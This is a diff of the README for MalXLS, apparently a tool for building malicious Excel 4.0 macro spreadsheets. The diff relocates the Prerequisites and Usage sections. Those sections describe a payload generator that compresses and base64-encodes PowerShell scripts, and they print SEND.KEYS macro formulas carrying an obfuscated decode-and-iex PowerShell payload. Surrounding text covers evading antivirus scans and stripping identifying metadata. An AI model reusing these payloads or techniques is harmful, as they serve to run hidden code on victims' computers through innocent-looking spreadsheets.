@@ -28,34 +28,6 @@ It is also not immediately obvious that the file contains a macro if it is saved
 - (Optional) Insert some faux data at the beginning of the sheet
 - Remove identifying information from the file (File > Info > Check for Issues > Inspect Document)
 
-### Prerequisites
-
-[.NET Framework 4.8](https://dotnet.microsoft.com/download/dotnet-framework/net48) is required to run the binary that computes payloads.
-
-If you are using Windows 10 with the May 2019 Update (1903) you are good to go, otherwise you need to install it.
-
-### Usage
-
-The payload generator can be downloaded from the [Releases](https://github.com/davidcristian/MalXLS/releases) page. The source code is available in the ``Generate Payload`` directory.
-
-```
-ComputePayload
-Usage: .\ComputePayload.exe [OPTION]... [FILE]... [-C]
-  -e    Compress a file using GZip and encode it into a base64 string
-  -f    Fix the bad characters in a file (use on one-liners)
-  -c    Copy the generated commands into the clipboard
-```
-Example:
-
-```
-.\ComputePayload.exe -e .\clear_history.ps1 -c 
-=SEND.KEYS("$b=""H4sIAAAAAAAEAJWQQWsCMRCF7wv{+}h0Es7h42h14KggeRWkvVLkbwID2k7sgGshnZjMoi/vcm7hZb8NDeMpm8L{+}{+}9XqGOmMklqtxoizCEuGcPxkDqh/gFOZ1TfjAI6fMIpDZo2dRjsqztAeEmTJJO1In0zst/ExM4dyKAsUFVpVNyHKbwboWO00xx0XxzU7zvWZNNxFQ7pqqWAeefeRAELcASSzpi{+}spYNraY9n{+}EtIQm4hAW"; TRUE)
-=SEND.KEYS("eGoxq3qPMNEh6D88BdrlR7xmGy42c72tyNGORUYnrGSBxohM{+}uocGQzcmed{+}DAZXaauMfYsXQOPwXmvfrjeydt60WOLO4DYYEyPnsPw0tefNSOVrzUWmKtbKLFSJcbdVrLXN6eTEhKrSdZOr0XsrIdHmb1g7zwvHtdIc9x/Okyd4vPSTO4l9C1/sVYH1SwIAAA=="";nal no New-Object -F;iex {(}no IO.StreamReader{(}no "; TRUE)
-=SEND.KEYS("IO.Compression.GZipStream{(}{(}no IO.MemoryStream -A @{(},{[}Convert{]}::FromBase64String{(}$b{)}{)}{)},{[}IO.Compression.CompressionMode{]}::Decompress{)}{)}{)}.ReadToEnd{(}{)}~{NUMLOCK}"; TRUE)
-```
-
-#
-
 <details>
   <summary>Book1.xls breakdown</summary>    
   <br /><img src="https://raw.githubusercontent.com/davidcristian/MalXLS/master/Excel%20File%20Examples/virus_scan.png" alt="A screenshot of the virus scan results from multiple engines" /><br /><p><a href="https://www.virustotal.com/gui/file/e5f25bb70bac14f8909fce9385a55557955b9bfa2a26d8be42ff5208f1488127/detection">Scan results</a></p><br /><img src="https://raw.githubusercontent.com/davidcristian/MalXLS/master/breakdown.png" alt="A screenshot of the commands (numbered) inside Book1.xls" />
@@ -80,6 +52,32 @@ Example:
     17. Close Excel (no warnings will be shown due to 1.)
   </p>
 </details>
+
+### Prerequisites
+
+[.NET Framework 4.8](https://dotnet.microsoft.com/download/dotnet-framework/net48) is required to run the binary that computes payloads.
+
+If you are using Windows 10 and have the May 2019 Update (1903) you are good to go, otherwise you need to install the runtime.
+
+### Usage
+
+The payload generator can be downloaded from the [Releases](https://github.com/davidcristian/MalXLS/releases) page. The source code is available in the ``Generate Payload`` directory.
+
+```
+ComputePayload
+Usage: .\ComputePayload.exe [OPTION]... [FILE]... [-C]
+  -e    Compress a file using GZip and encode it into a base64 string
+  -f    Fix the bad characters in a file (use on one-liners)
+  -c    Copy the generated commands into the clipboard
+```
+Example:
+
+```
+.\ComputePayload.exe -e .\clear_history.ps1 -c 
+=SEND.KEYS("$b=""H4sIAAAAAAAEAJWQQWsCMRCF7wv{+}h0Es7h42h14KggeRWkvVLkbwID2k7sgGshnZjMoi/vcm7hZb8NDeMpm8L{+}{+}9XqGOmMklqtxoizCEuGcPxkDqh/gFOZ1TfjAI6fMIpDZo2dRjsqztAeEmTJJO1In0zst/ExM4dyKAsUFVpVNyHKbwboWO00xx0XxzU7zvWZNNxFQ7pqqWAeefeRAELcASSzpi{+}spYNraY9n{+}EtIQm4hAW"; TRUE)
+=SEND.KEYS("eGoxq3qPMNEh6D88BdrlR7xmGy42c72tyNGORUYnrGSBxohM{+}uocGQzcmed{+}DAZXaauMfYsXQOPwXmvfrjeydt60WOLO4DYYEyPnsPw0tefNSOVrzUWmKtbKLFSJcbdVrLXN6eTEhKrSdZOr0XsrIdHmb1g7zwvHtdIc9x/Okyd4vPSTO4l9C1/sVYH1SwIAAA=="";nal no New-Object -F;iex {(}no IO.StreamReader{(}no "; TRUE)
+=SEND.KEYS("IO.Compression.GZipStream{(}{(}no IO.MemoryStream -A @{(},{[}Convert{]}::FromBase64String{(}$b{)}{)}{)},{[}IO.Compression.CompressionMode{]}::Decompress{)}{)}{)}.ReadToEnd{(}{)}~{NUMLOCK}"; TRUE)
+```
 
 ## Known Issues
 
